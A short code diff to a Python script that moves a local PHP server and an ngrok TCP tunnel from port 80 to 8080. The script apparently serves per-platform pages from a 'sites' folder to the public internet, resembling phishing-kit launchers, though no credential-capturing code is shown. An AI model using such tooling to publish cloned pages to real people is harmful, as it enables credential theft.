@@ -30,7 +30,7 @@ class colors:
 
 
 def tunneling():
-	tcp = ngrok.connect(80,"tcp")
+	tcp = ngrok.connect(8080,"tcp")
 	print(colors.GREEN+"here your ngrok address >> "+str(tcp)+colors.END)
 	input("")
 
@@ -38,8 +38,8 @@ def prepare(pfm,loop_count):
 	os.system("clear")
 	try:
 		print(colors.YELLOW+" ' Ctrl + C ' for back to menu \n")
-		print("System : "+colors.GREEN+"active \n"+colors.YELLOW+"Running : "+colors.GREEN+"localhost:80 >>>  {}".format(pfm)+colors.BLACK)
-		php = "php -S localhost:80 -t sites/{} > /dev/null 2>1&".format(pfm)
+		print("System : "+colors.GREEN+"active \n"+colors.YELLOW+"Running : "+colors.GREEN+"localhost:8080 >>>  {}".format(pfm)+colors.BLACK)
+		php = "php -S localhost:8080 -t sites/{} > /dev/null 2>1&".format(pfm)
 		if(loop_count < 1):
 			pro = subprocess.Popen(php, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 		
 		else:
